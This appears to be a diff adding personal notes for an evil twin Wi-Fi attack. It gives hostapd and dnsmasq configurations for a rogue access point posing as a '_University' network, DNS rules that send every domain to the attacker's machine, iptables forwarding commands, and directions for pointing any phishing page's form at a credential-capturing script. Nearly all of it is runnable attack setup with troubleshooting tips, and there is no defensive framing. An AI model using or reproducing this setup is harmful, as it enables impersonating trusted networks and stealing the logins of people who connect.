@@ -1,0 +1,77 @@
+https://sudorealm.com/blog/evil-twin-attack-guide
+
+first do airmon-ng check kill
+and then do these
+sudo hostapd hostapd2.conf 
+
+-hostapd2.conf contents:
+interface=wlan0
+driver=nl80211
+ssid=_University
+channel=6
+
+then do :
+
+ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0
+
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+
+sudo dnsmasq -C dnsmasq2.conf -d
+
+-dnsmasq2.conf contents:
+interface=wlan0
+
+domain-needed
+no-poll
+bogus-priv
+
+#DHCP
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+
+
+#server=10.0.0.138
+
+#log-queries
+#log-dhcp
+#listen-address=10.0.0.1
+
+#nameserver 127.0.0.1
+
+# ignore resolv.conf
+no-resolv
+# Listen only on localhost
+listen-address=127.0.0.1
+server=8.8.8.8
+port = 53
+address=/#/10.0.0.1
+
+address=/www.google.com/10.0.0.1 #works
+
+
+then type these
+
+sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE    --> eth0 here is whatever adapter is connected to legitimate wifi
+sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT  --> wlan0 is whatever wireless card you have plugged in
+
+then type 
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+make sure to copy the apache 000-default.conf from above website and do the rewrite thing. then
+sudo service apache2 start
+sudo service mysql start
+
+if you want to change the phishing site, just choose any phishing site, change the action to action=dbconnect.php. thats it
+
+
+
+
+
+# if your eth0 has an ip octet of 192.168.1.1/24 , then you have to put the dnsmasq2.conf with 10.0.0.1, and vice versa.
+# if it doesnt work, unplug your wireless card and try again. if still doesnt work, do airmon-ng check kill, then put it into monitor mode and then put it back to normal mode.
+
+
+also if you want airodump-ng to work, just unplug and plug again
